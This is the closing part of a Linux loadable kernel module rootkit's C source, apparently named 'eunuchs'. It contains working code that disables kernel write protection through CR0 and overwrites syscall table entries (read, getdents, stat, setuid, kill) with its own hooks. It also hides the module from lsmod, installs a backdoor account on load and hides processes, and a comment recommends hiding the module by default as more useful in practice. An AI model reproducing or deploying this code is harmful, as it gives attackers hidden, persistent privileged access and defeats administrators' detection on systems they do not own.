    return 0;
}

/**
 * eunuchs_hide_lkm() -
 *  Hides the module from `lsmod`
 **/
static int eunuchs_hide_lkm(void)
{
    debug("Hiding LKM from lsmod\n");
    mod_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    return 0;
}

/**
 * eunuchs_show_lkm() -
 *  Allows the module to be visible in `lsmod`
 **/
static int eunuchs_show_lkm(void)
{
    debug("Showing LKM in lsmod\n");
    if(mod_list)
    {
        list_add(&THIS_MODULE->list, mod_list);
        mod_list = NULL;
    }
    return 0;
}

/**
 * eunuchs_hooks_install() -
 *  Installs our hooks, saving the old system call function pointers
 **/
static int eunuchs_hooks_install(void)
{
    debug("installing hooks\n");

    orig_read = (typeof(sys_read) *)sct[__NR_read];
    orig_getdents = (typeof(sys_getdents) *)sct[__NR_getdents];
    orig_getdents64 = (typeof(sys_getdents64) *)sct[__NR_getdents64];
    orig_fstat64 = (typeof(sys_fstat64) *)sct[__NR_fstat64];
    orig_lstat64 = (typeof(sys_lstat64) *)sct[__NR_lstat64];
    orig_stat64 = (typeof(sys_stat64) *)sct[__NR_stat64];
    orig_setuid = (typeof(sys_setuid) *)sct[__NR_setuid32];
    orig_kill = (typeof(sys_kill) *)sct[__NR_kill];

    sct[__NR_read] = (void *)&eunuchs_read;
    sct[__NR_getdents] = (void *)&eunuchs_getdents;
    sct[__NR_getdents64] = (void *)&eunuchs_getdents64;
    sct[__NR_fstat64] = (void *)&eunuchs_fstat64;
    sct[__NR_lstat64] = (void *)&eunuchs_lstat64;
    sct[__NR_stat64] = (void *)&eunuchs_stat64;
    sct[__NR_setuid32] = (void *)&eunuchs_setuid;
    sct[__NR_kill] = (void *)&eunuchs_kill;

    return 0;
}

/**
 * eunuchs_hooks_remove() -
 *  Removes our hooks, restoring the original system call function pointers.
 **/
static void eunuchs_hooks_remove(void)
{
    debug("removing hooks\n");
    sct[__NR_read] = (void *)orig_read;
    sct[__NR_getdents] = (void *)orig_getdents;
    sct[__NR_getdents64] = (void *)orig_getdents64;
    sct[__NR_fstat64] = (void *)orig_fstat64;
    sct[__NR_lstat64] = (void *)orig_lstat64;
    sct[__NR_stat64] = (void *)orig_stat64;
    sct[__NR_setuid32] = (void *)orig_setuid;
    sct[__NR_kill] = (void *)orig_kill;
}

/**
 * Initializes the LKM.
 **/
static int eunuchs_init(void)
{
    debug("init\n");

    /* set up char device */
    if(eunuchs_dev_init() == -1)
        return -1;

    /* initialize our lists */
    if(eunuchs_lists_init() == -1)
        return -1;

    /* install backdoor account */
    eunuchs_install_backdoor();

    /* install hooks */
    cr0_enable_write();
    eunuchs_hooks_install();
    process_hide_init();
    cr0_disable_write();


    /**
     * should we hide the module during initialization?
     *
     * uncomment the following line to hide the module by default.. more useful
     * in practice, but then you don't get to experience the joy of echo'ing
     * kthxbye to the char device.
     **/
    /* eunuchs_hide_lkm(); */

    return 0;
}

/**
 * Unloads the LKM.
 **/
static void eunuchs_exit(void)
{
    debug("exit\n");

    eunuchs_show_lkm();

    cr0_enable_write();
    eunuchs_hooks_remove();
    process_hide_remove();
    cr0_disable_write();

    eunuchs_dev_remove();
    eunuchs_lists_free();
}

module_init(eunuchs_init);
module_exit(eunuchs_exit);

MODULE_AUTHOR("meow?");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("yeth plz");
MODULE_VERSION("1.0");
MODULE_ALIAS("kthxbye");
